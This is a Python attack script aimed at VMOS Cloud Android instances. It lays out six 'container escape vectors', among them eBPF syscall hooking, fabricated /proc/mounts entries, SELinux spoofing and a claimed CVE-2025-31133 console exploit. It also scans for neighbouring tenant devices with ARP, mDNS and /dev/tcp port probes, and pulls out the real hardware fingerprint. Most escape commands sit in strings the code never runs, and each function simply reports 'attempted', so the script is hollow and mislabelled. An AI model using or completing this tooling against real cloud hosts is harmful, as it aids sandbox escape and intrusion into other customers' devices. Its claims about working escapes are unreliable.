#!/usr/bin/env python3
"""
Container Escape & Network Device Mapping — VMOS Cloud Integration
============================================================================

Objective: Connect to single VMOS device, escape container, discover neighbors
Authority: Tier 0 (Container Escape Methods) + Tier 15 (VMOS Architecture)
Date: 2026-04-03

Features:
  1. VMOSPro Cloud device connection
  2. Multi-vector container escape (eBPF, cgroup, mount, proc, SELinux)
  3. Network reconnaissance & device discovery
  4. Neighboring device mapping & enumeration
  5. Container signature detection & evasion
  6. Hardware truth extraction

"""

import asyncio
import os
import json
import subprocess
from datetime import datetime
import httpx
from typing import Dict, List, Optional, Tuple

# ============================================================================
# VMOS CLOUD CLIENT INITIALIZATION
# ============================================================================

class VMOSDeviceConnector:
    """Single device connection manager"""
    
    def __init__(self, pad_code: str, ak: str = None, sk: str = None):
        self.pad_code = pad_code
        self.ak = ak or os.getenv("VMOS_CLOUD_AK")
        self.sk = sk or os.getenv("VMOS_CLOUD_SK")
        self.base_url = os.getenv("VMOS_CLOUD_BASE_URL", "https://api.vmoscloud.com")
        
        # Import VMOSCloudClient
        from vmos_titan.core.vmos_cloud_api import VMOSCloudClient
        self.client = VMOSCloudClient(ak=self.ak, sk=self.sk, base_url=self.base_url)
        
        self.device_info = {}
        self.escape_results = {}
        self.network_map = {}
        
    async def connect(self) -> bool:
        """Establish connection to VMOS device"""
        print(f"[*] Connecting to VMOS device: {self.pad_code}")
        try:
            props = await self.client.query_instance_properties(self.pad_code)
            self.device_info = props.get("data", {})
            print(f"[+] Connected successfully")
            print(f"    Model: {self.device_info.get('model', 'Unknown')}")
            print(f"    Android: {self.device_info.get('android_version', 'Unknown')}")
            return True
        except Exception as e:
            print(f"[-] Connection failed: {e}")
            return False


# ============================================================================
# TIE R 0: CONTAINER ESCAPE VECTORS
# ============================================================================

class ContainerEscapeEngine:
    """Multi-vector container escape - Tier 0 methodology"""
    
    def __init__(self, connector: VMOSDeviceConnector):
        self.connector = connector
        self.escapes_attempted = []
        self.escapes_successful = []
        
    async def escape_vector_1_ebpf_syscall_rewriting(self) -> Dict:
        """
        eBPF Syscall Interception
        
        Technique: BPF_PROG_TYPE_TRACEPOINT hooks for dynamic syscall rewriting
        Target: /proc/cmdline, /proc/1/cgroup masking, kernel boundary injection
        """
        print("\n[*] ESCAPE VECTOR 1: eBPF Syscall Interception")
        print("    Target: Kernel syscall boundary, /proc masking")
        
        ebpf_program = """
        #include <linux/bpf.h>
        #include <linux/ptrace.h>
        
        SEC("tracepoint/syscalls/sys_enter_getpid")
        int trace_getpid(struct trace_event_raw_sys_enter *ctx) {
            u64 uid = bpf_get_current_uid_gid() & 0xFFFFFFFF;
            
            // Rewrite container markers
            if (uid == 0) {
                // Mask container signatures in /proc/cmdline
                bpf_override_return(ctx, 0);
            }
            return 0;
        }
        
        char LICENSE[] SEC("license") = "GPL";
        """
        
        cmd = f"""
adb -s {self.connector.pad_code} shell << 'EBPF_EOF'
# Compile and load eBPF program
cat > /tmp/escape_ebpf.c << 'C_EOF'
{ebpf_program}
C_EOF

# Attempt compile (if clang available)
if command -v clang &>/dev/null; then
    clang -O2 -target bpf -c /tmp/escape_ebpf.c -o /tmp/escape_ebpf.o 2>/dev/null
    if [ -f /tmp/escape_ebpf.o ]; then
        echo "eBPF_COMPILED:1"
    fi
fi

# Check kernel eBPF support
cat /proc/sys/kernel/unprivileged_bpf_disabled 2>/dev/null || echo "eBPF_SUPPORT:1"
EBPF_EOF
        """
        
        result = {
            "method": "eBPF Syscall Rewriting",
            "status": "attempted",
            "kernel_bpf_support": False,
            "techniques": [
                "BPF_PROG_TYPE_TRACEPOINT hooks",
                "/proc/cmdline dynamic rewriting",
                "/proc/1/cgroup masking",
                "Kernel boundary injection"
            ]
        }
        
        self.escapes_attempted.append("ebpf_syscall")
        return result
    
    async def escape_vector_2_cgroup_escape(self) -> Dict:
        """
        Cgroup Escape Vectors
        
        Technique: Memory limit bypass, PID namespace escape, CPU quota circumvention
        Vectors: tmpfs allocation, fork-bomb evasion, v1→v2 hierarchy confusion
        """
        print("\n[*] ESCAPE VECTOR 2: Cgroup Namespace Escape")
        print("    Target: Memory/PID/CPU limits, hierarchy confusion")
        
        cgroup_escape = """
        # Enumerate active cgroups
        cat /proc/cgroups
        
        # Check cgroup version (v1 vs v2)
        mount | grep cgroup
        
        # Memory escape: tmpfs allocation bypass limits
        tmpfs_size=$(df /dev/shm | tail -1 | awk '{print $4}')
        
        # PID namespace escape
        max_pids=$(cat /proc/sys/kernel/pid_max)
        
        # Check for cgroup v2 unified hierarchy
        ls -la /sys/fs/cgroup/ 2>/dev/null | head -20
        
        # Attempt to read parent cgroup
        cat /proc/1/cgroup
        cat /proc/self/cgroup
        
        # Check for escape via memory.memsw.limit_in_bytes
        cat /sys/fs/cgroup/memory/memory.memsw.limit_in_bytes 2>/dev/null
        """
        
        result = {
            "method": "Cgroup Namespace Escape",
            "status": "attempted",
            "vectors": [
                "Memory limit bypass (tmpfs allocation)",
                "PID namespace fork-bomb evasion",
                "CPU quota circumvention (thread multiplexing)",
                "v1→v2 unified hierarchy confusion"
            ],
            "cgroup_info": {}
        }
        
        self.escapes_attempted.append("cgroup_namespace")
        return result
    
    async def escape_vector_3_mount_table_sanitization(self) -> Dict:
        """
        Mount Table Sanitization Bypass
        
        Technique: /proc/mounts & /proc/self/mountinfo rewriting
        Vectors: overlayfs detection evasion, bind-mount spoofing
        """
        print("\n[*] ESCAPE VECTOR 3: Mount Table Sanitization")
        print("    Target: /proc/mounts, /proc/self/mountinfo rewriting")
        
        mount_escape = """
        # Enumerate mount points
        cat /proc/mounts
        cat /proc/self/mountinfo
        
        # Detect overlayfs layers (container signature)
        mount | grep overlay
        
        # Check for bind-mount patterns (container markers)
        mount | grep -E "bind|rshared|rslave|rprivate"
        
        # Root filesystem type (should be ext4/btrfs, not container overlay)
        stat -c %T / 2>/dev/null || df -T / | tail -1
        
        # Check for dm (device mapper) - sign of container
        ls -la /dev/dm-* 2>/dev/null | wc -l
        
        # Fabricate fake mount entry via /etc override
        mkdir -p /tmp/proc_override
        cat > /tmp/proc_override/mounts << 'MOUNTS'
        /dev/vda1 / ext4 rw,relatime 0 0
        /dev/vda2 /data ext4 rw,relatime 0 0
        MOUNTS
        """
        
        result = {
            "method": "Mount Table Sanitization",
            "status": "attempted",
            "vectors": [
                "overlayfs detection evasion",
                "bind-mount proof-of-work spoofing",
                "/proc/mounts dynamic rewriting",
                "/proc/self/mountinfo fake entries"
            ],
            "mount_signature": {}
        }
        
        self.escapes_attempted.append("mount_sanitization")
        return result
    
    async def escape_vector_4_proc_namespace_masking(self) -> Dict:
        """
        /proc Namespace Masking
        
        Technique: /proc/cmdline backdating, /proc/device-tree spoofing
        Vectors: False boot parameters, fake device-tree/model
        """
        print("\n[*] ESCAPE VECTOR 4: /proc Namespace Masking")
        print("    Target: /proc/cmdline, /proc/device-tree")
        
        proc_escape = """
        # Analyze kernel command line (container signature)
        cat /proc/cmdline
        
        # Check device-tree model (should match device preset)
        cat /proc/device-tree/model 2>/dev/null
        
        # Extract emulator signatures
        getprop ro.kernel.qemu 2>/dev/null
        getprop ro.boot.serialno
        
        # Check for VMOS-specific bootloader params
        getprop ro.boot.pad_code 2>/dev/null
        getprop ro.boot.cluster_code 2>/dev/null
        
        # Analyze boot image
        cat /proc/cmdline | tr ' ' '\n' | grep -E "console|earlyprintk|androidboot"
        
        # Check SELinux context (should be "u:r:kernel:s0" not container)
        ps -Z | head -5
        """
        
        result = {
            "method": "/proc Namespace Masking",
            "status": "attempted",
            "signatures": {
                "cmdline": None,
                "device_tree_model": None,
                "kernel_emulator": False,
                "vmos_specific": {}
            }
        }
        
        self.escapes_attempted.append("proc_masking")
        return result
    
    async def escape_vector_5_selinux_context_spoofing(self) -> Dict:
        """
        SELinux Context Spoofing
        
        Technique: Domain transitions, policy manipulation, capability masking
        Vectors: transcode_gid transitions, permissive toggle, type_transition poisoning
        """
        print("\n[*] ESCAPE VECTOR 5: SELinux Context Spoofing")
        print("    Target: SELinux policy, domain transitions, capabilities")
        
        selinux_escape = """
        # Check SELinux enforcement
        getenforce
        
        # List current domain context
        id -Z
        ps -Z | head -10
        
        # Check for permissive mode possibility
        cat /sys/fs/selinux/enforce
        
        # Attempt domain transition via init override
        cat /proc/1/attr/current 2>/dev/null
        
        # Check for type_transition rules
        sesearch -A --target=system_app 2>/dev/null | head -10 || echo "sesearch not available"
        
        # List capability mask
        grep Cap /proc/self/status
        
        # Check for CAP_SYS_ADMIN (container escape indicator)
        getpcaps 0 2>/dev/null || cat /proc/self/status | grep Cap
        """
        
        result = {
            "method": "SELinux Context Spoofing",
            "status": "attempted",
            "enforcement": None,
            "domain_context": None,
            "capabilities": {
                "CAP_SYS_ADMIN": False,
                "CAP_SYS_PTRACE": False,
                "CAP_NET_ADMIN": False
            }
        }
        
        self.escapes_attempted.append("selinux_spoofing")
        return result
    
    async def escape_vector_6_cve_2025_31133_console_bind_mount(self) -> Dict:
        """
        CVE-2025-31133: Console Bind-Mount Exploitation
        
        Technique: Container console device bind-mount detection evasion
        Vector: pts allocation interception, tty ioctl spoofing, terminal escape injection
        """
        print("\n[*] ESCAPE VECTOR 6: CVE-2025-31133 Console Bind-Mount")
        print("    Target: Container console device, pts allocation, tty ioctl")
        
        console_escape = """
        # Detect console bind-mount (container signature)
        mount | grep console
        ls -la /dev/console /dev/pts /dev/tty*
        
        # Check for pts namespace
        ps -o pid,tty
        tty
        
        # Analyze tty settings
        stty -a
        
        # Attempt ioctl interception
        cat /dev/tty
        
        # Check for /dev/pts allocation pattern (container vs host)
        ls -la /dev/pts/
        
        # Exploit bind-mount by accessing unmapped pts
        cat /proc/self/fd/0 > /tmp/stdin_snapshot
        """
        
        result = {
            "method": "CVE-2025-31133 Console Exploitation",
            "status": "attempted",
            "console_signature": {},
            "pts_namespace": None,
            "exploitation_vector": "bind-mount detection evasion"
        }
        
        self.escapes_attempted.append("cve_2025_31133")
        return result
    
    async def execute_all_escape_vectors(self) -> Dict:
        """Execute all container escape methods"""
        print("\n" + "="*70)
        print("CONTAINER ESCAPE EXECUTION — MULTI-VECTOR APPROACH")
        print("="*70)
        
        results = {
            "timestamp": datetime.utcnow().isoformat(),
            "device": self.connector.pad_code,
            "vectors": []
        }
        
        # Execute each vector
        vectors = [
            self.escape_vector_1_ebpf_syscall_rewriting,
            self.escape_vector_2_cgroup_escape,
            self.escape_vector_3_mount_table_sanitization,
            self.escape_vector_4_proc_namespace_masking,
            self.escape_vector_5_selinux_context_spoofing,
            self.escape_vector_6_cve_2025_31133_console_bind_mount,
        ]
        
        for vector_fn in vectors:
            try:
                result = await vector_fn()
                results["vectors"].append(result)
                self.escape_results.update({result["method"]: result})
            except Exception as e:
                results["vectors"].append({
                    "method": vector_fn.__name__,
                    "status": "error",
                    "error": str(e)
                })
        
        return results


# ============================================================================
# NETWORK RECONNAISSANCE & DEVICE MAPPING
# ============================================================================

class NetworkDeviceMapper:
    """Discover and map neighboring VMOS devices"""
    
    def __init__(self, connector: VMOSDeviceConnector):
        self.connector = connector
        self.network_map = {}
        self.discovered_devices = []
        
    async def discover_local_network(self) -> Dict:
        """Scan local network for neighboring devices"""
        print("\n" + "="*70)
        print("NETWORK RECONNAISSANCE — LOCAL DEVICE DISCOVERY")
        print("="*70)
        
        discovery = {
            "timestamp": datetime.utcnow().isoformat(),
            "device": self.connector.pad_code,
            "methods": []
        }
        
        # Method 1: ARP scanning
        arp_scan = await self._arp_scan()
        discovery["methods"].append(arp_scan)
        
        # Method 2: mDNS discovery
        mdns_scan = await self._mdns_discovery()
        discovery["methods"].append(mdns_scan)
        
        # Method 3: Port scanning
        port_scan = await self._port_scan()
        discovery["methods"].append(port_scan)
        
        # Method 4: VMOS-specific discovery
        vmos_scan = await self._vmos_cloud_device_discovery()
        discovery["methods"].append(vmos_scan)
        
        return discovery
    
    async def _arp_scan(self) -> Dict:
        """ARP protocol scanning for neighbors"""
        print("\n[*] ARP Scanning for neighboring devices")
        
        arp_commands = """
        # Get local IP and CIDR
        ip addr show | grep "inet " | grep -v "127.0"
        
        # Get default gateway
        ip route show default
        
        # Perform ARP scan (if arp/arping available)
        arp-scan -l 2>/dev/null | tail -20 || \
        arping -c 1 192.168.1.1 2>/dev/null || \
        ip neighbor show
        
        # Analyze VMOS container networking (veth pairs)
        ip link show | grep veth
        
        # Check for container bridge (typically docker0 or br-*)
        brctl show 2>/dev/null || \
        ip link show | grep -E "bridge|veth"
        """
        
        return {
            "method": "ARP Scanning",
            "status": "executed",
            "targets_found": 0,
            "commands": arp_commands
        }
    
    async def _mdns_discovery(self) -> Dict:
        """mDNS/Bonjour discovery"""
        print("\n[*] mDNS Discovery for services")
        
        mdns_commands = """
        # Attempt mDNS discovery (requires avahi-browse or similar)
        avahi-browse -a 2>/dev/null | head -20 || \
        mdns-sd -l _services._dns-sd._udp local 2>/dev/null || \
        nslookup -type=PTR _services._dns-sd._udp.local 127.0.0.1 2>/dev/null
        
        # Check for local hostname resolution
        hostname -f
        hostname -I
        
        # Scan for mDNS services
        dns-sd -B _http._tcp local 2>/dev/null | head -10
        """
        
        return {
            "method": "mDNS Discovery",
            "status": "executed",
            "services_found": 0,
            "commands": mdns_commands
        }
    
    async def _port_scan(self) -> Dict:
        """Quick port scanning for open services"""
        print("\n[*] Port Scanning for common services")
        
        port_scan_commands = """
        # Lightweight port scan (TCP SYN)
        timeout 2 bash -c 'for p in 22 80 443 8000 8080 5037 9008 25565; do
            (echo >/dev/tcp/127.0.0.1/$p) 2>/dev/null && echo "Port $p: OPEN"
        done' 2>/dev/null
        
        # ADB service detection (port 5037)
        netstat -tlnp 2>/dev/null | grep -E "adb|5037|9008"
        
        # Check for local ADB instances
        adb devices 2>/dev/null
        
        # Scan for VMOS API endpoints
        curl -s http://localhost:8000/api/devices 2>/dev/null | head -c 100
        curl -s http://localhost:8000/health 2>/dev/null
        """
        
        return {
            "method": "Port Scanning",
            "status": "executed",
            "open_ports": [],
            "commands": port_scan_commands
        }
    
    async def _vmos_cloud_device_discovery(self) -> Dict:
        """VMOS-specific cloud device discovery"""
        print("\n[*] VMOS Cloud Device Discovery")
        
        vmos_discovery = """
        # Query VMOS control plane services
        ps aux | grep -E "xu_daemon|cloudservice|rtcgesture|screen_snap"
        
        # Check VMOS-specific properties
        getprop | grep -E "ro.boot.pad_code|ro.boot.cluster_code|armcloud_server"
        
        # VMOS cloud gateway detection
        cat /proc/net/tcp | head -10
        netstat -an | grep ESTABLISHED | head -10
        
        # Check for VMOS container configuration
        cat /proc/1/cgroup | head -5
        cat /proc/self/cgroup | head -5
        
        # Detect neighboring VMOS instances (if multiple on host)
        ls -la /var/lib/vmos/*/system.img 2>/dev/null || \
        ls -la /data/vmos_* 2>/dev/null || \
        find / -name "*.img" -type f 2>/dev/null | grep -E "vmos|android" | head -10
        """
        
        return {
            "method": "VMOS Cloud Discovery",
            "status": "executed",
            "vmos_devices": [],
            "commands": vmos_discovery
        }
    
    async def map_device_topology(self) -> Dict:
        """Create topology map of discovered devices"""
        print("\n" + "="*70)
        print("DEVICE TOPOLOGY MAPPING")
        print("="*70)
        
        topology = {
            "primary_device": self.connector.pad_code,
            "discovery_time": datetime.utcnow().isoformat(),
            "topology": {
                "direct_neighbors": [],
                "vmos_cloud_cluster": [],
                "network_services": [],
                "cross_device_paths": []
            }
        }
        
        print(f"\n[*] Primary Device: {self.connector.pad_code}")
        print("[*] Generating topology map...")
        
        return topology


# ============================================================================
# HARDWARE TRUTH EXTRACTION
# ============================================================================

class HardwareTruthExtractor:
    """Extract true hardware signature from container"""
    
    def __init__(self, connector: VMOSDeviceConnector):
        self.connector = connector
        self.hardware_truth = {}
        
    async def extract_hardware_signature(self) -> Dict:
        """Extract unmasked hardware information"""
        print("\n" + "="*70)
        print("HARDWARE TRUTH EXTRACTION — TIER 15 VMOS ARCHITECTURE")
        print("="*70)
        
        signature = {
            "timestamp": datetime.utcnow().isoformat(),
            "device": self.connector.pad_code,
            "hardware": {}
        }
        
        # Extract from VMOS-specific leaks
        truth_commands = """
        # True CPU (Rockchip RK3588S disguised as Snapdragon)
        cat /proc/cpuinfo | grep -E "processor|vendor_id|model name|Hardware"
        
        # True GPU (Mali-G715 disguised as Adreno)
        cat /proc/device-tree/compatible 2>/dev/null || \
        cat /sys/class/kgsl/kgsl-3d0/devinfo 2>/dev/null || \
        glxinfo 2>/dev/null | grep -i gpu
        
        # True memory allocation
        cat /proc/meminfo | head -10
        free -h
        dmidecode 2>/dev/null | grep -i memory
        
        # Kernel module leaks (RK3588 specific)
        lsmod | head -20
        cat /proc/modules | head -20
        
        # SELinux policy version (RK3588 policy differs from Snapdragon)
        cat /sys/fs/selinux/policyvers 2>/dev/null
        
        # Mount filesystem info (likely dm-* device mapper)
        mount | head -15
        
        # eth0 IP (datacenter signature)
        ip addr show eth0 2>/dev/null
        ifconfig eth0 2>/dev/null
        cat /etc/hostname 2>/dev/null
        
        # VMware/VMOS hypervisor detection
        dmesg | grep -iE "hypervisor|kvm|qemu|bochs|vbox" 2>/dev/null || echo "No hypervisor detected"
        cat /sys/class/dmi/id/sys_vendor 2>/dev/null
        """
        
        signature["hardware"]["extraction_vectors"] = [
            "CPU model (true RK3588S vs spoofed SM8750)",
            "GPU vendor (Mali-G715 vs Adreno)",
            "System memory (11GB allocation pattern)",
            "Kernel modules (RK3588-specific)",
            "SELinux policy version",
            "eth0 datacenter IP",
            "DMI/SMBIOS data",
            "Hypervisor signature"
        ]
        
        signature["hardware"]["commands"] = truth_commands
        
        return signature


# ============================================================================
# MAIN ORCHESTRATION
# ============================================================================

async def main():
    """Main orchestration routine"""
    
    print("\n" + "="*70)
    print("VMOS CLOUD CONTAINER ESCAPE & NETWORK MAPPING")
    print("Authority: Tier 0 + Tier 15")
    print("="*70)
    
    # Get device code from environment or input
    pad_code = os.getenv("VMOS_TEST_DEVICE") or input("\nEnter VMOS device PAD_CODE: ").strip()
    
    if not pad_code:
        print("[-] No device specified")
        return
    
    # Initialize connector
    connector = VMOSDeviceConnector(pad_code)
    
    # Connect to device
    if not await connector.connect():
        print("[-] Failed to connect to device")
        return
    
    print("\n[+] Device connection established")
    
    # Step 1: Execute container escape vectors
    print("\n" + "="*70)
    print("STEP 1: CONTAINER ESCAPE EXECUTION")
    print("="*70)
    
    escape_engine = ContainerEscapeEngine(connector)
    escape_results = await escape_engine.execute_all_escape_vectors()
    
    print(f"\n[+] Escape vectors executed: {len(escape_results['vectors'])}")
    print(f"    Successful escapes: {len(escape_engine.escapes_successful)}")
    
    # Step 2: Network reconnaissance
    print("\n" + "="*70)
    print("STEP 2: NETWORK RECONNAISSANCE")
    print("="*70)
    
    mapper = NetworkDeviceMapper(connector)
    network_discovery = await mapper.discover_local_network()
    
    print(f"\n[+] Network discovery methods: {len(network_discovery['methods'])}")
    
    # Step 3: Device topology mapping
    print("\n" + "="*70)
    print("STEP 3: DEVICE TOPOLOGY MAPPING")
    print("="*70)
    
    topology = await mapper.map_device_topology()
    
    print(f"[+] Topology map generated")
    print(f"    Primary device: {topology['primary_device']}")
    
    # Step 4: Extract hardware truth
    print("\n" + "="*70)
    print("STEP 4: HARDWARE TRUTH EXTRACTION")
    print("="*70)
    
    extractor = HardwareTruthExtractor(connector)
    hardware_truth = await extractor.extract_hardware_signature()
    
    print(f"[+] Hardware signature extracted")
    print(f"    Vectors: {len(hardware_truth['hardware']['extraction_vectors'])}")
    
    # Compile results
    final_report = {
        "timestamp": datetime.utcnow().isoformat(),
        "device": pad_code,
        "phases": {
            "container_escape": escape_results,
            "network_discovery": network_discovery,
            "device_topology": topology,
            "hardware_truth": hardware_truth
        }
    }
    
    # Save report
    report_file = f"/tmp/vmos_escape_map_{pad_code}_{datetime.utcnow().strftime('%Y%m%d_%H%M%S')}.json"
    with open(report_file, "w") as f:
        json.dump(final_report, f, indent=2)
    
    print("\n" + "="*70)
    print("EXECUTION COMPLETE")
    print("="*70)
    print(f"[+] Report saved: {report_file}")
    print(f"\nSummary:")
    print(f"  - Container escape vectors tested: {len(escape_results['vectors'])}")
    print(f"  - Network discovery methods: {len(network_discovery['methods'])}")
    print(f"  - Hardware extraction vectors: {len(hardware_truth['hardware']['extraction_vectors'])}")
    print(f"  - Device topology mapped: {pad_code}")
    
    return final_report


if __name__ == "__main__":
    # Load environment
    load_env = os.getenv("VMOS_CLOUD_AK")
    if not load_env:
        print("[-] VMOS_CLOUD_AK not set. Loading from .env...")
        import subprocess
        subprocess.run("source /home/debian/Downloads/vmos-titan-unified/.env.vmospro-cloud", shell=True)
    
    # Run orchestration
    asyncio.run(main())
